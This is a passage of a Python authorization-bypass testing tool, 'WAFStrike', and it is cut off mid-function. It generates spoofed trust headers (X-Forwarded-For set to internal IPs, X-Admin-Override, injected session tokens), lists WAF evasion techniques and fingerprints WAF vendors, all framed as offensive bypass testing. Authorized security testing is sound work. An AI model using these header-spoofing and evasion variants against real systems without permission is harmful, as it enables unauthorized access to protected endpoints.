#!/usr/bin/env python3
"""
WAFStrike v2.0.0 - Research-Grade Authorization Testing Framework

A context-aware authorization validation framework that confirms real 
authorization failures with high confidence through multi-layer analysis,
WAF vs backend correlation, and state-aware validation.
"""

import argparse
import asyncio
import json
import sys
import time
import urllib.parse
import hashlib
import re
from dataclasses import dataclass, asdict, field
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Set, Any, Union
import logging
from collections import defaultdict, Counter
import statistics

try:
    import aiohttp
    import colorama
    from colorama import Fore, Style
except ImportError:
    print("Required dependencies not found. Install with: pip install aiohttp colorama")
    sys.exit(1)

colorama.init()

def load_banner():
    """Load and display the WAFStrike banner"""
    # Print ASCII banner first if not in silent mode
    if not is_silent_mode():
        banner_path = Path.home() / "Desktop" / "WAFStrike" / "assets" / "banner.txt"
        try:
            with open(banner_path, 'r') as f:
                banner_content = f.read().strip()
            print(f"{Fore.CYAN}{banner_content}{Style.RESET_ALL}")
        except FileNotFoundError:
            pass  # Silent if banner file not found
        except Exception:
            print(f"{Fore.RED}[CRITICAL ERROR] Failed to load banner{Style.RESET_ALL}", file=sys.stderr)
            sys.exit(1)
    
    # Always print version line (exactly once) with colored WAFSTRIKE
    print(f"{Fore.RED}{Style.BRIGHT}WAFSTRIKE{Style.RESET_ALL} v2.0.0 | Research-Grade Authorization Testing Framework")

def is_silent_mode():
    """Check if silent mode is enabled"""
    return hasattr(is_silent_mode, '_silent') and is_silent_mode._silent

def set_silent_mode(silent):
    """Set silent mode flag"""
    is_silent_mode._silent = silent

def safe_print(message, critical=False):
    """Print message respecting silent mode"""
    if critical or not is_silent_mode():
        print(message)

class VariantType(Enum):
    """Authorization-relevant dimensions for request ambiguity"""
    IDENTITY = "identity"
    ROUTING = "routing" 
    PROXY_TRUST = "proxy_trust"
    SCHEME = "scheme"
    PORT = "port"

class HeaderGroup(Enum):
    """Structured header groups for trust and identity inference"""
    CLIENT_IP = "client_ip"
    FORWARDING = "forwarding"
    PROXY = "proxy"
    URL = "url"
    SCHEME = "scheme"

class AuthorizationState(Enum):
    """Authorization validation states for confirmed findings"""
    UNAUTHORIZED = "unauthorized"
    AUTHORIZED = "authorized"
    PARTIAL_ACCESS = "partial_access"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    CONTEXT_MISMATCH = "context_mismatch"
    STATE_INVALID = "state_invalid"

class ValidationLevel(Enum):
    """Confidence levels for authorization validation"""
    NONE = "none"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"
    CONFIRMED = "confirmed"

class WAFDetectionResult(Enum):
    """WAF presence and behavior detection"""
    NO_WAF = "no_waf"
    WAF_DETECTED = "waf_detected"
    WAF_BLOCKING = "waf_blocking"
    WAF_PASSIVE = "waf_passive"
    WAF_EVASION_POSSIBLE = "waf_evasion_possible"

class BypassStatus(Enum):
    """Bypass classification for offensive security reporting"""
    CONFIRMED_BYPASS = "confirmed_bypass"
    PARTIAL_BYPASS = "partial_bypass"
    BYPASS_PRECONDITION = "bypass_precondition"
    NO_BYPASS = "no_bypass"

class RiskCategory(Enum):
    """Offensive security classification categories"""
    AUTHORIZATION_BYPASS = "authorization_bypass"
    TRUST_BOUNDARY_FAILURE = "trust_boundary_failure"
    WEAKEST_PATH_DISCOVERY = "weakest_path_discovery"
    IDENTITY_SPOOFING = "identity_spoofing"
    PROXY_TRUST_ABUSE = "proxy_trust_abuse"
    URL_NORMALIZATION_MISMATCH = "url_normalization_mismatch"
    PROTOCOL_CONFUSION = "protocol_confusion"

@dataclass
class IdentityContext:
    """Identity context for authorization testing"""
    user_id: Optional[str] = None
    role: Optional[str] = None
    permissions: Set[str] = field(default_factory=set)
    session_token: Optional[str] = None
    ip_address: Optional[str] = None
    user_agent: Optional[str] = None
    headers: Dict[str, str] = field(default_factory=dict)
    confidence: float = 0.0
    
@dataclass
class AuthorizationContext:
    """Complete authorization context for validation"""
    endpoint: str
    method: str
    required_permissions: Set[str] = field(default_factory=set)
    identity_context: IdentityContext = field(default_factory=IdentityContext)
    session_state: Dict[str, Any] = field(default_factory=dict)
    validation_level: ValidationLevel = ValidationLevel.NONE
    waf_detected: WAFDetectionResult = WAFDetectionResult.NO_WAF
    
@dataclass
class ConfidenceMetrics:
    """Confidence scoring metrics for validation"""
    reproducibility_score: float = 0.0
    state_persistence_score: float = 0.0
    cross_check_score: float = 0.0
    consistency_score: float = 0.0
    overall_confidence: float = 0.0
    validation_attempts: int = 0
    successful_validations: int = 0
    
@dataclass
class WAFBehavior:
    """WAF behavior analysis results"""
    detected: bool = False
    blocking_patterns: Set[str] = field(default_factory=set)
    response_signatures: Dict[str, str] = field(default_factory=dict)
    evasion_techniques: List[str] = field(default_factory=list)
    confidence: float = 0.0
    
@dataclass
class RequestVariant:
    """Single request variant with controlled ambiguity"""
    variant_type: VariantType
    headers: Dict[str, str]
    url: str
    method: str = "GET"
    body: Optional[str] = None

@dataclass
class ResponseFingerprint:
    """Behavioral fingerprint for differential analysis"""
    status_code: int
    response_size: int
    redirect_location: Optional[str]
    cache_headers: Dict[str, str]
    response_time_ms: float
    content_markers: Set[str]

@dataclass
class SecurityFinding:
    """Research-grade authorization finding with confirmed validation"""
    bypass_status: BypassStatus
    authorization_state: AuthorizationState
    validation_level: ValidationLevel
    risk_category: RiskCategory
    confidence_metrics: ConfidenceMetrics
    bypass_technique: str
    impact_description: str
    attack_preconditions: List[str]
    confirmed_bypass_details: Dict[str, Any]
    exploitability_likelihood: str
    hardening_recommendations: List[str]
    request_variants: List[RequestVariant]
    baseline_fingerprint: ResponseFingerprint
    variant_fingerprints: List[Tuple[RequestVariant, ResponseFingerprint]]
    authorization_context: AuthorizationContext
    waf_behavior: WAFBehavior
    identity_divergence: Dict[str, Any] = field(default_factory=dict)
    state_transitions: List[Dict[str, Any]] = field(default_factory=list)
    cross_validation_results: Dict[str, Any] = field(default_factory=dict)
    false_positive_checks: Dict[str, bool] = field(default_factory=dict)
    reproduction_steps: List[str] = field(default_factory=list)

class SafetyControls:
    """Red-team appropriate guardrails for offensive bypass testing"""
    
    def __init__(self):
        self.max_requests_per_target = 50
        self.rate_limit_delay = 0.5
        self.bypass_status_codes = {200, 201, 202, 204}  # Confirmed bypass indicators
        self.partial_bypass_indicators = {301, 302, 303, 307, 403}  # Partial bypass indicators
        self.recursion_depth = 0
        self.max_recursion_depth = 2
        self.content_harvesting_blocked = True
        self.privilege_escalation_blocked = True
        self.bypass_confirmed = False
        self.bypass_halt_on_success = True
        
    def check_request_limit(self, request_count: int) -> bool:
        return request_count < self.max_requests_per_target
        
    def check_rate_limit(self) -> None:
        time.sleep(self.rate_limit_delay)
        
    def should_halt_on_bypass(self, status_code: int, content_markers: Set[str]) -> bool:
        """Check if bypass is confirmed and testing should halt"""
        if status_code in self.bypass_status_codes:
            return True
        if "admin_content" in content_markers or "privileged_access" in content_markers:
            return True
        return False
        
    def is_partial_bypass(self, status_code: int, baseline_status: int, content_markers: Set[str]) -> bool:
        """Check if partial bypass is achieved"""
        if status_code in self.partial_bypass_indicators and baseline_status >= 400:
            return True
        if status_code < baseline_status and status_code < 400:
            return True
        return False
        
    def confirm_bypass(self, variant: RequestVariant, fingerprint: ResponseFingerprint) -> bool:
        """Confirm if bypass condition is met"""
        if self.should_halt_on_bypass(fingerprint.status_code, fingerprint.content_markers):
            self.bypass_confirmed = True
            return True
        return False
        
    def check_recursion_depth(self) -> bool:
        return self.recursion_depth < self.max_recursion_depth

class AuthorizationValidator:
    """Core authorization validation engine for v2.0.0"""
    
    def __init__(self, safety_controls: SafetyControls):
        self.safety = safety_controls
        self.validation_history: List[Dict[str, Any]] = []
        self.confidence_thresholds = {
            ValidationLevel.NONE: 0.0,
            ValidationLevel.LOW: 0.25,
            ValidationLevel.MEDIUM: 0.50,
            ValidationLevel.HIGH: 0.75,
            ValidationLevel.CRITICAL: 0.90,
            ValidationLevel.CONFIRMED: 0.95
        }
        
    def validate_authorization_state(self, 
                                   baseline: ResponseFingerprint,
                                   variant: ResponseFingerprint,
                                   auth_context: AuthorizationContext) -> Tuple[AuthorizationState, ValidationLevel]:
        """Validate authorization state with context awareness"""
        
        # Analyze response patterns for authorization indicators
        auth_indicators = self._extract_authorization_indicators(variant)
        baseline_indicators = self._extract_authorization_indicators(baseline)
        
        # Determine authorization state
        if self._is_unauthorized_response(variant, auth_indicators):
            return AuthorizationState.UNAUTHORIZED, ValidationLevel.HIGH
            
        elif self._is_authorized_response(variant, auth_indicators):
            # Check if this represents privilege escalation
            if self._is_privilege_escalation(baseline, variant, auth_context):
                return AuthorizationState.PRIVILEGE_ESCALATION, ValidationLevel.CONFIRMED
            return AuthorizationState.AUTHORIZED, ValidationLevel.HIGH
            
        elif self._is_partial_access(variant, auth_indicators):
            return AuthorizationState.PARTIAL_ACCESS, ValidationLevel.MEDIUM
            
        elif self._has_context_mismatch(baseline, variant, auth_context):
            return AuthorizationState.CONTEXT_MISMATCH, ValidationLevel.MEDIUM
            
        else:
            return AuthorizationState.STATE_INVALID, ValidationLevel.LOW
    
    def _extract_authorization_indicators(self, fingerprint: ResponseFingerprint) -> Dict[str, Any]:
        """Extract authorization-relevant indicators from response"""
        indicators = {
            'error_messages': [],
            'success_indicators': [],
            'privilege_markers': [],
            'session_indicators': [],
            'redirect_patterns': []
        }
        
        # Analyze content markers for authorization patterns
        for marker in fingerprint.content_markers:
            if 'auth_error' in marker:
                indicators['error_messages'].append(marker)
            elif 'success_indicator' in marker:
                indicators['success_indicators'].append(marker)
            elif 'privileged_access' in marker:
                indicators['privilege_markers'].append(marker)
                
        # Analyze status codes
        if fingerprint.status_code == 401:
            indicators['error_messages'].append('http_401_unauthorized')
        elif fingerprint.status_code == 403:
            indicators['error_messages'].append('http_403_forbidden')
        elif fingerprint.status_code in [200, 201, 202]:
            indicators['success_indicators'].append(f'http_{fingerprint.status_code}_success')
            
        # Analyze redirects
        if fingerprint.redirect_location:
            indicators['redirect_patterns'].append(fingerprint.redirect_location)
            
        return indicators
    
    def _is_unauthorized_response(self, fingerprint: ResponseFingerprint, indicators: Dict[str, Any]) -> bool:
        """Check if response indicates unauthorized access"""
        # Strong unauthorized indicators
        if fingerprint.status_code in [401, 403]:
            return True
            
        # Content-based unauthorized indicators
        unauthorized_patterns = [
            'access denied', 'unauthorized', 'forbidden',
            'login required', 'authentication required',
            'insufficient privileges'
        ]
        
        for marker in fingerprint.content_markers:
            for pattern in unauthorized_patterns:
                if pattern in marker.lower():
                    return True
                    
        return False
    
    def _is_authorized_response(self, fingerprint: ResponseFingerprint, indicators: Dict[str, Any]) -> bool:
        """Check if response indicates authorized access"""
        # Strong authorized indicators
        if fingerprint.status_code in [200, 201, 202, 204]:
            # Additional check for actual content (not empty success)
            if fingerprint.response_size > 100 or indicators['privilege_markers']:
                return True
                
        # Content-based authorized indicators
        authorized_patterns = [
            'welcome', 'dashboard', 'overview', 'summary',
            'successfully', 'logged in', 'session active'
        ]
        
        for marker in fingerprint.content_markers:
            for pattern in authorized_patterns:
                if pattern in marker.lower():
                    return True
                    
        return False
    
    def _is_privilege_escalation(self, baseline: ResponseFingerprint, 
                               variant: ResponseFingerprint,
                               auth_context: AuthorizationContext) -> bool:
        """Check if variant represents privilege escalation"""
        # If baseline was unauthorized but variant is authorized
        if (self._is_unauthorized_response(baseline, self._extract_authorization_indicators(baseline)) and
            self._is_authorized_response(variant, self._extract_authorization_indicators(variant))):
            return True
            
        # Check for higher privilege content in variant
        baseline_privileges = len([m for m in baseline.content_markers if 'privileged_access' in m])
        variant_privileges = len([m for m in variant.content_markers if 'privileged_access' in m])
        
        return variant_privileges > baseline_privileges
    
    def _is_partial_access(self, fingerprint: ResponseFingerprint, indicators: Dict[str, Any]) -> bool:
        """Check if response indicates partial access"""
        # Partial access often shows as redirects with limited content
        if fingerprint.status_code in [301, 302, 303, 307]:
            if fingerprint.response_size < 1000:  # Small redirect response
                return True
                
        # Mixed indicators (some success, some error)
        if indicators['success_indicators'] and indicators['error_messages']:
            return True
            
        return False
    
    def _has_context_mismatch(self, baseline: ResponseFingerprint,
                            variant: ResponseFingerprint,
                            auth_context: AuthorizationContext) -> bool:
        """Check for authorization context mismatch"""
        # Different responses for same identity context
        if (baseline.status_code != variant.status_code and
            abs(baseline.response_size - variant.response_size) > 500):
            return True
            
        # Inconsistent content markers
        marker_diff = baseline.content_markers.symmetric_difference(variant.content_markers)
        if len(marker_diff) > 3:
            return True
            
        return False
    
    def calculate_confidence_metrics(self, 
                                   validation_results: List[Tuple[AuthorizationState, ValidationLevel]],
                                   cross_checks: Dict[str, bool]) -> ConfidenceMetrics:
        """Calculate comprehensive confidence metrics"""
        metrics = ConfidenceMetrics()
        metrics.validation_attempts = len(validation_results)
        
        # Reproducibility score
        if validation_results:
            state_counts = Counter([state for state, _ in validation_results])
            most_common_count = state_counts.most_common(1)[0][1]
            metrics.reproducibility_score = most_common_count / len(validation_results)
        
        # State persistence score
        high_confidence_validations = sum(1 for _, level in validation_results 
                                        if level in [ValidationLevel.HIGH, ValidationLevel.CRITICAL, ValidationLevel.CONFIRMED])
        if validation_results:
            metrics.state_persistence_score = high_confidence_validations / len(validation_results)
        
        # Cross-check score
        if cross_checks:
            passed_checks = sum(1 for check_passed in cross_checks.values() if check_passed)
            metrics.cross_check_score = passed_checks / len(cross_checks)
        
        # Consistency score
        if validation_results:
            levels = [level for _, level in validation_results]
            level_consistency = 1.0 - (statistics.stdev(levels) if len(levels) > 1 else 0)
            metrics.consistency_score = max(0, level_consistency)
        
        # Overall confidence (weighted average)
        weights = {
            'reproducibility': 0.3,
            'persistence': 0.3,
            'cross_check': 0.25,
            'consistency': 0.15
        }
        
        metrics.overall_confidence = (
            metrics.reproducibility_score * weights['reproducibility'] +
            metrics.state_persistence_score * weights['persistence'] +
            metrics.cross_check_score * weights['cross_check'] +
            metrics.consistency_score * weights['consistency']
        )
        
        metrics.successful_validations = high_confidence_validations
        
        return metrics

class IdentityContextTester:
    """Multi-layer identity context divergence testing for v2.0.0"""
    
    def __init__(self, safety_controls: SafetyControls):
        self.safety = safety_controls
        self.tested_identities: List[IdentityContext] = []
        self.divergence_patterns: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
        
    def create_identity_contexts(self, base_url: str) -> List[IdentityContext]:
        """Create multiple identity contexts for divergence testing"""
        contexts = []
        
        # Base unauthorized context
        contexts.append(IdentityContext(
            user_id="anonymous",
            role="guest",
            permissions=set(),
            ip_address="203.0.113.1",  # External IP
            confidence=0.8
        ))
        
        # Internal IP contexts
        internal_ips = ["127.0.0.1", "192.168.1.100", "10.0.0.50", "172.16.0.25"]
        for i, ip in enumerate(internal_ips):
            contexts.append(IdentityContext(
                user_id=f"internal_user_{i}",
                role="internal",
                permissions={"internal_access"},
                ip_address=ip,
                confidence=0.7
            ))
        
        # Trusted proxy contexts
        trusted_contexts = [
            {
                "user_id": "trusted_service",
                "role": "service",
                "permissions": {"service_access", "bypass_auth"},
                "headers": {"X-Forwarded-For": "127.0.0.1", "X-Service-Token": "trusted"}
            },
            {
                "user_id": "admin_override",
                "role": "administrator",
                "permissions": {"admin_access", "override_controls"},
                "headers": {"X-Admin-Override": "true", "X-Internal-Request": "true"}
            }
        ]
        
        for ctx_data in trusted_contexts:
            contexts.append(IdentityContext(
                user_id=ctx_data["user_id"],
                role=ctx_data["role"],
                permissions=ctx_data["permissions"],
                headers=ctx_data["headers"],
                confidence=0.9
            ))
        
        # Session reuse contexts
        session_tokens = ["sess_abc123", "sess_def456", "sess_invalid"]
        for token in session_tokens:
            contexts.append(IdentityContext(
                user_id="session_user",
                role="authenticated",
                permissions={"user_access"},
                session_token=token,
                confidence=0.6 if token != "sess_invalid" else 0.2
            ))
        
        return contexts
    
    def test_identity_divergence(self, 
                               base_context: IdentityContext,
                               variant_contexts: List[IdentityContext],
                               endpoint: str) -> Dict[str, Any]:
        """Test identity context divergence across multiple contexts"""
        divergence_results = {
            'base_context': base_context,
            'tested_contexts': variant_contexts,
            'divergence_detected': False,
            'divergence_patterns': [],
            'privilege_escalation': [],
            'context_inconsistencies': []
        }
        
        # Analyze each variant context
        for variant_context in variant_contexts:
            divergence_analysis = self._analyze_context_divergence(base_context, variant_context, endpoint)
            
            if divergence_analysis['has_divergence']:
                divergence_results['divergence_detected'] = True
                divergence_results['divergence_patterns'].append(divergence_analysis)
                
            if divergence_analysis['privilege_escalation']:
                divergence_results['privilege_escalation'].append(divergence_analysis)
                
            if divergence_analysis['context_inconsistency']:
                divergence_results['context_inconsistencies'].append(divergence_analysis)
        
        return divergence_results
    
    def _analyze_context_divergence(self, 
                                  base_context: IdentityContext,
                                  variant_context: IdentityContext,
                                  endpoint: str) -> Dict[str, Any]:
        """Analyze divergence between two identity contexts"""
        analysis = {
            'base_context': base_context,
            'variant_context': variant_context,
            'endpoint': endpoint,
            'has_divergence': False,
            'divergence_type': None,
            'privilege_escalation': False,
            'context_inconsistency': False,
            'confidence_delta': variant_context.confidence - base_context.confidence
        }
        
        # Check for IP-based divergence
        if base_context.ip_address != variant_context.ip_address:
            if self._is_internal_ip(variant_context.ip_address) and not self._is_internal_ip(base_context.ip_address):
                analysis['has_divergence'] = True
                analysis['divergence_type'] = 'ip_trust_boundary'
                
        # Check for role-based divergence
        if base_context.role != variant_context.role:
            base_privilege_level = self._get_privilege_level(base_context.role)
            variant_privilege_level = self._get_privilege_level(variant_context.role)
            
            if variant_privilege_level > base_privilege_level:
                analysis['privilege_escalation'] = True
                analysis['has_divergence'] = True
                analysis['divergence_type'] = 'role_escalation'
                
        # Check for permission-based divergence
        base_perms = base_context.permissions
        variant_perms = variant_context.permissions
        
        if variant_perms - base_perms:  # Variant has permissions base doesn't
            analysis['has_divergence'] = True
            analysis['divergence_type'] = 'permission_expansion'
            
        # Check for header-based divergence
        if base_context.headers != variant_context.headers:
            trust_headers = ['X-Forwarded-For', 'X-Real-IP', 'X-Service-Token', 'X-Admin-Override']
            for header in trust_headers:
                if header in variant_context.headers and header not in base_context.headers:
                    analysis['has_divergence'] = True
                    analysis['divergence_type'] = 'header_trust_manipulation'
                    break
                    
        # Check for session-based divergence
        if base_context.session_token != variant_context.session_token:
            if variant_context.session_token and not base_context.session_token:
                analysis['has_divergence'] = True
                analysis['divergence_type'] = 'session_injection'
                
        return analysis
    
    def _is_internal_ip(self, ip: str) -> bool:
        """Check if IP address is internal/trusted"""
        if not ip:
            return False
            
        internal_patterns = [
            "127.", "192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.",
            "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.",
            "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.",
            "localhost", "::1"
        ]
        
        return any(ip.startswith(pattern) for pattern in internal_patterns)
    
    def _get_privilege_level(self, role: str) -> int:
        """Get numeric privilege level for role comparison"""
        role_hierarchy = {
            'guest': 0,
            'user': 1,
            'authenticated': 2,
            'internal': 3,
            'service': 4,
            'administrator': 5,
            'admin': 5,
            'system': 6
        }
        
        return role_hierarchy.get(role.lower(), 0)
    
    def generate_divergence_variants(self, 
                                    base_context: IdentityContext,
                                    divergence_analysis: Dict[str, Any]) -> List[RequestVariant]:
        """Generate request variants based on divergence analysis"""
        variants = []
        variant_context = divergence_analysis['variant_context']
        divergence_type = divergence_analysis['divergence_type']
        
        if divergence_type == 'ip_trust_boundary':
            # Generate IP-based variants
            headers = {
                'X-Forwarded-For': variant_context.ip_address,
                'X-Real-IP': variant_context.ip_address,
                'X-Client-IP': variant_context.ip_address
            }
            
        elif divergence_type == 'role_escalation':
            # Generate role-based variants
            headers = {
                'X-User-Role': variant_context.role,
                'X-Requested-With': variant_context.role
            }
            
        elif divergence_type == 'permission_expansion':
            # Generate permission-based variants
            headers = {
                'X-User-Permissions': ','.join(variant_context.permissions),
                'X-Granted-Scopes': ','.join(variant_context.permissions)
            }
            
        elif divergence_type == 'header_trust_manipulation':
            # Use variant headers directly
            headers = variant_context.headers.copy()
            
        elif divergence_type == 'session_injection':
            # Generate session-based variants
            headers = {
                'Cookie': f'sessionid={variant_context.session_token}',
                'Authorization': f'Bearer {variant_context.session_token}'
            }
            
        else:
            headers = {}
            
        # Create request variant
        variants.append(RequestVariant(
            variant_type=VariantType.IDENTITY,
            headers=headers,
            url="",  # Will be set by caller
            method="GET"
        ))
        
        return variants

class AdaptiveRequestEngine:
    """Adaptive request logic that learns from target behavior for v2.0.0"""
    
    def __init__(self, safety_controls: SafetyControls):
        self.safety = safety_controls
        self.behavioral_patterns: Dict[str, Any] = {}
        self.adaptive_strategies: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
        self.learning_history: List[Dict[str, Any]] = []
        
    def analyze_target_behavior(self, 
                               responses: List[Tuple[RequestVariant, ResponseFingerprint]]) -> Dict[str, Any]:
        """Analyze target behavior to adapt request strategies"""
        if not responses:
            return {}
            
        behavior_analysis = {
            'response_patterns': self._analyze_response_patterns(responses),
            'status_code_tendencies': self._analyze_status_codes(responses),
            'content_patterns': self._analyze_content_patterns(responses),
            'timing_patterns': self._analyze_timing_patterns(responses),
            'waf_indicators': self._detect_waf_indicators(responses),
            'adaptation_recommendations': []
        }
        
        # Generate adaptation recommendations
        behavior_analysis['adaptation_recommendations'] = self._generate_adaptations(behavior_analysis)
        
        return behavior_analysis
    
    def _analyze_response_patterns(self, responses: List[Tuple[RequestVariant, ResponseFingerprint]]) -> Dict[str, Any]:
        """Analyze response patterns for behavioral insights"""
        patterns = {
            'common_status_codes': Counter(),
            'size_ranges': [],
            'redirect_patterns': Counter(),
            'content_marker_frequency': Counter()
        }
        
        for variant, fingerprint in responses:
            patterns['common_status_codes'][fingerprint.status_code] += 1
            patterns['size_ranges'].append(fingerprint.response_size)
            
            if fingerprint.redirect_location:
                patterns['redirect_patterns'][fingerprint.redirect_location] += 1
                
            for marker in fingerprint.content_markers:
                patterns['content_marker_frequency'][marker] += 1
        
        # Calculate statistics
        if patterns['size_ranges']:
            patterns['size_stats'] = {
                'min': min(patterns['size_ranges']),
                'max': max(patterns['size_ranges']),
                'avg': statistics.mean(patterns['size_ranges']),
                'median': statistics.median(patterns['size_ranges'])
            }
        
        return patterns
    
    def _analyze_status_codes(self, responses: List[Tuple[RequestVariant, ResponseFingerprint]]) -> Dict[str, Any]:
        """Analyze status code patterns and tendencies"""
        status_analysis = {
            'success_rate': 0,
            'error_distribution': Counter(),
            'variant_success_rates': defaultdict(list),
            'blocking_indicators': []
        }
        
        total_responses = len(responses)
        success_count = 0
        
        for variant, fingerprint in responses:
            if fingerprint.status_code in [200, 201, 202, 204]:
                success_count += 1
                status_analysis['variant_success_rates'][variant.variant_type.value].append(True)
            else:
                status_analysis['variant_success_rates'][variant.variant_type.value].append(False)
                
            # Categorize errors
            if fingerprint.status_code in [401, 403]:
                status_analysis['error_distribution']['auth_error'] += 1
            elif fingerprint.status_code in [400, 422]:
                status_analysis['error_distribution']['client_error'] += 1
            elif fingerprint.status_code >= 500:
                status_analysis['error_distribution']['server_error'] += 1
            else:
                status_analysis['error_distribution']['other'] += 1
                
            # Check for WAF blocking patterns
            if fingerprint.status_code == 403 and 'waf' in fingerprint.content_markers:
                status_analysis['blocking_indicators'].append({
                    'variant_type': variant.variant_type.value,
                    'headers': variant.headers,
                    'response_time': fingerprint.response_time_ms
                })
        
        if total_responses > 0:
            status_analysis['success_rate'] = success_count / total_responses
            
        # Calculate success rates by variant type
        for variant_type, results in status_analysis['variant_success_rates'].items():
            if results:
                status_analysis['variant_success_rates'][variant_type] = sum(results) / len(results)
            else:
                status_analysis['variant_success_rates'][variant_type] = 0.0
                
        return status_analysis
    
    def _analyze_content_patterns(self, responses: List[Tuple[RequestVariant, ResponseFingerprint]]) -> Dict[str, Any]:
        """Analyze content patterns for insights"""
        content_analysis = {
            'privileged_content_indicators': Counter(),
            'error_message_patterns': Counter(),
            'success_indicators': Counter(),
            'content_similarity': []
        }
        
        for variant, fingerprint in responses:
            for marker in fingerprint.content_markers:
                if 'privileged_access' in marker:
                    content_analysis['privileged_content_indicators'][marker] += 1
                elif 'auth_error' in marker:
                    content_analysis['error_message_patterns'][marker] += 1
                elif 'success_indicator' in marker:
                    content_analysis['success_indicators'][marker] += 1
        
        return content_analysis
    
    def _analyze_timing_patterns(self, responses: List[Tuple[RequestVariant, ResponseFingerprint]]) -> Dict[str, Any]:
        """Analyze timing patterns for behavioral insights"""
        timing_data = [fingerprint.response_time_ms for _, fingerprint in responses]
        
        if not timing_data:
            return {}
            
        return {
            'response_time_stats': {
                'min': min(timing_data),
                'max': max(timing_data),
                'avg': statistics.mean(timing_data),
                'median': statistics.median(timing_data),
                'std_dev': statistics.stdev(timing_data) if len(timing_data) > 1 else 0
            },
            'slow_responses': len([t for t in timing_data if t > 2000]),  # > 2 seconds
            'fast_responses': len([t for t in timing_data if t < 500])    # < 0.5 seconds
        }
    
    def _detect_waf_indicators(self, responses: List[Tuple[RequestVariant, ResponseFingerprint]]) -> Dict[str, Any]:
        """Detect WAF presence and behavior patterns"""
        waf_indicators = {
            'detected': False,
            'blocking_patterns': set(),
            'response_signatures': {},
            'evasion_techniques': [],
            'confidence': 0.0
        }
        
        waf_signatures = [
            'cloudflare', 'incapsula', 'akamai', 'fastly',
            'mod_security', 'owasp', 'sucuri', 'imperva'
        ]
        
        blocking_patterns = [
            'access denied', 'blocked', 'forbidden',
            'security violation', 'request blocked'
        ]
        
        for variant, fingerprint in responses:
            # Check for WAF signatures in content
            content_lower = ' '.join(fingerprint.content_markers).lower()
            for signature in waf_signatures:
                if signature in content_lower:
                    waf_indicators['detected'] = True
                    waf_indicators['response_signatures'][signature] = fingerprint.status_code
                    
            # Check for blocking patterns
            for pattern in blocking_patterns:
                if pattern in content_lower:
                    waf_indicators['blocking_patterns'].add(pattern)
                    
        # Calculate WAF confidence
        confidence_factors = [
            waf_indicators['detected'],
            len(waf_indicators['blocking_patterns']) > 0,
            any(fingerprint.status_code == 403 for _, fingerprint in responses)
        ]
        
        waf_indicators['confidence'] = sum(confidence_factors) / len(confidence_factors)
        
        return waf_indicators
    
    def _generate_adaptations(self, behavior_analysis: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate adaptive strategies based on behavior analysis"""
        adaptations = []
        
        # Analyze success rates by variant type
        status_analysis = behavior_analysis.get('status_code_tendencies', {})
        variant_success_rates = status_analysis.get('variant_success_rates', {})
        
        # Focus on successful variant types
        successful_variants = [
            variant_type for variant_type, success_rate in variant_success_rates.items()
            if success_rate > 0.3  # 30% success threshold
        ]
        
        if successful_variants:
            adaptations.append({
                'strategy': 'focus_successful_variants',
                'priority': 'high',
                'description': f'Focus on {successful_variants} variants showing success',
                'variant_types': successful_variants
            })
        
        # WAF-specific adaptations
        waf_indicators = behavior_analysis.get('waf_indicators', {})
        if waf_indicators.get('detected'):
            adaptations.append({
                'strategy': 'waf_evasion',
                'priority': 'high',
                'description': 'WAF detected - implement evasion techniques',
                'evasion_techniques': self._get_waf_evasion_techniques(waf_indicators)
            })
        
        # Content-based adaptations
        content_patterns = behavior_analysis.get('content_patterns', {})
        if content_patterns.get('privileged_content_indicators'):
            adaptations.append({
                'strategy': 'content_refinement',
                'priority': 'medium',
                'description': 'Refine requests based on privileged content indicators',
                'focus_areas': list(content_patterns['privileged_content_indicators'].keys())
            })
        
        return adaptations
    
    def _get_waf_evasion_techniques(self, waf_indicators: Dict[str, Any]) -> List[str]:
        """Get WAF evasion techniques based on detected WAF"""
        techniques = []
        
        signatures = waf_indicators.get('response_signatures', {})
        
        if 'cloudflare' in signatures:
            techniques.extend([
                'user_agent_rotation',
                'header_obfuscation',
                'request_fragmentation'
            ])
        elif 'mod_security' in signatures:
            techniques.extend([
                'encoding_variation',
                'parameter_pollution',
                'method_override'
            ])
        else:
            techniques.extend([
                'generic_evasion',
                'timing_variation',
                'header_manipulation'
            ])
        
        return techniques

class WAFBackendCorrelation:
    """WAF vs Backend decision correlation engine for v2.0.0"""
    
    def __init__(self, safety_controls: SafetyControls):
        self.safety = safety_controls
        self.waf_signatures: Dict[str, Any] = {}
        self.backend_patterns: Dict[str, Any] = {}
        self.correlation_history: List[Dict[str, Any]] = []
        
    def detect_waf_presence(self, responses: List[Tuple[RequestVariant, ResponseFingerprint]]) -> WAFDetectionResult:
        """Detect WAF presence and behavior patterns"""
        if not responses:
            return WAFDetectionResult.NO_WAF
            
        waf_indicators = {
            'signatures_found': [],
            'blocking_patterns': [],
            'response_consistency': 0,
            'timing_anomalies': [],
            'header_manipulation_evidence': []
        }
        
        # Analyze responses for WAF signatures
        for variant, fingerprint in responses:
            content_markers = ' '.join(fingerprint.content_markers).lower()
            
            # Check for common WAF signatures
            waf_signatures = {
                'cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
                'akamai': ['akamai', 'akamai-ghost'],
                'fastly': ['fastly', 'x-served-by'],
                'mod_security': ['mod_security', 'owasp'],
                'imperva': ['imperva', 'incapsula']
            }
            
            for waf_name, signatures in waf_signatures.items():
                for signature in signatures:
                    if signature in content_markers:
                        waf_indicators['signatures_found'].append(waf_name)
                        
            # Check for blocking patterns
            blocking_indicators = [
                'access denied', 'blocked', 'forbidden',
                'security violation', 'request blocked',
                'firewall', 'protection active'
            ]
            
            for indicator in blocking_indicators:
                if indicator in content_markers:
                    waf_indicators['blocking_patterns'].append({
                        'pattern': indicator,
                        'status_code': fingerprint.status_code,
                        'variant_type': variant.variant_type.value
                    })
            
            # Check for timing anomalies (WAFs often add consistent delays)
            if fingerprint.response_time_ms > 1000:  # > 1 second
                waf_indicators['timing_anomalies'].append({
                    'response_time': fingerprint.response_time_ms,
                    'variant_type': variant.variant_type.value
                })
                
            # Check for header manipulation evidence
            if variant.headers and fingerprint.status_code == 403:
